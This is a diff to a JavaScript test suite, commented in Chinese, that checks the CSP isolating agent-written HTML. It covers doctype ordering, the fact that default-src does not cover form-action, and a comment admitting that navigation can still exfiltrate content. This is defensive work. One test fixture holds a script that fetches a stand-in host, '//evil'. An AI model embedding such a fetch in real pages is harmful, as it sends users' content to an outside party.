@@ -60,31 +60,56 @@ test("CSP 默认什么都不许，出网整个关掉", () => {
       return [name, rest];
     }),
   );
-  assert.deepEqual(directives["default-src"], ["'none'"], "默认不是 none，出网就没关住");
-  // connect-src / frame-src / form-action 都**不该**被放行 —— default-src 兜住它们。
-  for (const escape of ["connect-src", "frame-src", "form-action"]) {
-    assert.ok(!(escape in directives), `${escape} 被单独放行了，脚本能把论文内容发出去`);
-  }
+  assert.deepEqual(directives["default-src"], ["'none'"], "默认不是 none，取数据就没关住");
+  // connect-src 不该被放行 —— default-src 兜住它。
+  //
+  // 原来这里还断言 form-action「由 default-src 兜住」——**那是错的**，
+  // form-action 不在 default-src 的回退链里。表单提交目前是 sandbox 挡的
+  // （没给 allow-forms），不是 CSP。
+  assert.ok(!("connect-src" in directives), "connect-src 被单独放行了，脚本能把论文内容发出去");
   // 但图表要画得出来。
   assert.ok(directives["img-src"], "图片全禁了，图表库画不出东西");
   assert.ok(directives["script-src"]?.includes("'unsafe-inline'"), "内联脚本被禁，图表跑不起来");
 });
 
-test("CSP 插在最前面 —— meta CSP 只约束它之后的内容", () => {
-  // 插晚了，前面的 <script> 已经跑过了。
+test("doctype 在最前，CSP 紧随其后且在任何脚本之前", () => {
   const out = withBoardHtmlCsp('<!doctype html><script>fetch("//evil")</script>');
+  // CSP 要早于脚本，否则脚本已经跑过了。
   assert.ok(
     out.indexOf("Content-Security-Policy") < out.indexOf("<script>"),
     "CSP 插在了脚本后面，对它无效",
   );
-  assert.ok(out.startsWith("<meta http-equiv=\"Content-Security-Policy\""), "CSP 不是第一个节点");
+  // **doctype 必须在 meta 之前。** 原来直接把 meta 怼在最前，解析器在 initial
+  // insertion mode 见到开始标签会打开 quirks 标志，agent 自己那个 doctype 随后
+  // 在 in-head 阶段被忽略 —— 它本地看着对的排版到了这里会变形。
+  assert.ok(/^<!doctype html>/i.test(out), "开头不是 doctype —— 页面会进 quirks mode");
+  assert.ok(
+    out.toLowerCase().indexOf("<!doctype") < out.indexOf("<meta"),
+    "doctype 在 meta 后面，等于没有",
+  );
   assert.ok(out.includes(BOARD_HTML_CSP), "注进去的不是那条 CSP");
 });
 
 test("原文一个字节都不改 —— 这不是消毒，是隔离", () => {
   // 想把危险标签删掉是错的路子：消毒永远漏，而隔离是结构性的。
+  // 我们只在**前面**加 doctype + CSP，原文原样跟在后面。
   const html = '<!doctype html><p onclick="x">hi</p><script>1</script>';
   assert.ok(withBoardHtmlCsp(html).endsWith(html), "改动了 agent 写的内容");
+});
+
+test("注释不能再说「CSP 把出网整个关掉」—— 它管不住导航", () => {
+  // `default-src 'none'` 是 fetch 指令族。一行 location.href 照样把内容送出去，
+  // 而能管住 iframe 导航的是**父页面**的 frame-src，这个应用还没有文档级 CSP。
+  // 这条守的是「别再让下一个人以为已经断网了」。
+  const doc = read("../../src/features/reader/domain/board-html.ts");
+  // **这里只能做正向断言。** 想写 `doesNotMatch(/CSP 把出网整个关掉/)` 是不行的
+  // —— 那份注释里正引用着这句原话来说明它错在哪，负向断言会命中自己的引文
+  // （写这条时当场撞上了，和今天在 CSS 注释、在 ICONS 表上踩的是同一个形状：
+  // 断言的那个串在别处也出现）。
+  assert.match(doc, /管不住导航/, "没写清 CSP 管不到的那一半");
+  assert.match(doc, /frame-src/, "没指出该由谁来挡导航");
+  assert.match(doc, /form-action`? 不在 default-src 的回退链里/,
+    "没纠正「form-action 由 default-src 兜住」那句错话");
 });
 
 // ------------------------------------------------------------------ 列表
